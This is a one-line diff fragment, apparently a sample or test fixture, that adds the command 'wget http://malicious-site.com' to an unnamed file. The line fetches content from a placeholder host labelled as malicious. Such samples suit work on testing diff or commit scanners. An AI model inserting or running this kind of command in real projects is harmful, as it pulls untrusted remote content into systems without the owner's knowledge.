@@ -1,0 +1,1 @@
+wget http://malicious-site.com
